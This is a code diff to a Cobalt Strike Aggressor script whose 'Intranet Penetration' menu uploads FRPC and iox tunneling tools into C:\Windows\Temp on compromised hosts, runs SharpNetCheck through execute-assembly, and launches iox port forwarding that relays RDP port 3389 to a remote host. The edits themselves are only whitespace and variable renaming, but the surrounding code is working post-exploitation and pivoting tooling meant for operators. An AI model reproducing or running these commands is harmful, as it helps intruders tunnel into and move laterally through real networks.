@@ -17,6 +17,7 @@ menu "Intranet Penetration" {
             dbutton_action($dialog, "RUN");
 			dialog_show($dialog);
         }
+
 sub SharpNetCheck {
 		$arg = join(' ', @($3['type'],"-host",$3['host']));
 		bexecute_assembly($bid, script_resource("/script/SharpNetCheck.exe"), $arg);
@@ -25,7 +26,7 @@ sub SharpNetCheck {
 			item "Upload FRPC" {
 				$bid = $1;
 				$dialog = dialog("Upload FRPC", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &FRP);
-				drow_text($dialog, "UploadPath",  "UploadPath:"); 	
+				drow_text($dialog, "UploadPath",  "UploadPath:");
 				dbutton_action($dialog, "Upload");
 				dialog_show($dialog);
         }
@@ -41,12 +42,12 @@ sub FRP {
 }
                 item "Run FRPC"{
                     $bid = $1['@'];
-                    $Dialog = dialog("Run FRPC",%(ip => "127.0.0.1", port => "3389",bid => $bid),&frpc_run);
-                    dialog_description($Dialog, "Run FRPC by frpModify.");
-                    drow_text($Dialog, "ip", "IP: ");
-                    drow_text($Dialog, "port", "Port: ");
-                    dbutton_action($Dialog, "RUN");
-                    dialog_show($Dialog);
+                    $dialog = dialog("Run FRPC",%(ip => "127.0.0.1", port => "3389",bid => $bid),&frpc_run);
+                    dialog_description($dialog, "Run FRPC by frpModify.");
+                    drow_text($dialog, "ip", "IP: ");
+                    drow_text($dialog, "port", "Port: ");
+                    dbutton_action($dialog, "RUN");
+                    dialog_show($dialog);
                 }
 
 sub frpc_run{
@@ -67,7 +68,7 @@ sub frpc_run{
 			item "Upload iox" {
 				$bid = $1;
 				$dialog = dialog("Upload iox", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &iox);
-				drow_text($dialog, "UploadPath",  "UploadPath: "); 	
+				drow_text($dialog, "UploadPath",  "UploadPath: ");
 				dbutton_action($dialog, "Upload");
 				dialog_show($dialog);
         }
@@ -79,13 +80,13 @@ sub iox {
     }
                 item "Run iox"{
                     $bid = $1['@'];
-                    $Dialog = dialog("Run iox",%(lhost => "127.0.0.1:3389", rhost => "*8.8.8.8:3389", hex => "656565",bid => $bid),&iox_run);
-                    dialog_description($Dialog, "lhost:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 rhost:./iox fwd -l *8888 -l 33890 -k 656565");
-                    drow_text($Dialog, "lhost", "lhost: ");
-                    drow_text($Dialog, "rhost", "rhost: ");
-					drow_text($Dialog, "hex", "hex: ");
-                    dbutton_action($Dialog, "RUN");
-                    dialog_show($Dialog);
+                    $dialog = dialog("Run iox",%(lhost => "127.0.0.1:3389", rhost => "*8.8.8.8:3389", hex => "656565",bid => $bid),&iox_run);
+                    dialog_description($dialog, "lhost:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 rhost:./iox fwd -l *8888 -l 33890 -k 656565");
+                    drow_text($dialog, "lhost", "lhost: ");
+                    drow_text($dialog, "rhost", "rhost: ");
+					drow_text($dialog, "hex", "hex: ");
+                    dbutton_action($dialog, "RUN");
+                    dialog_show($dialog);
                 }
 
 sub iox_run{
@@ -94,7 +95,7 @@ sub iox_run{
     $rhost = replace($3['rhost'], "\"", "");
 	$hex = $3['hex'];
 	bshell($bid, "iox.exe fwd -r  $+ $lhost -r  $+ $rhost -k  $+ $hex");
-}  
+}
         	item "Delete iox"{
         	local('$bid');
         	foreach $bid ($1){
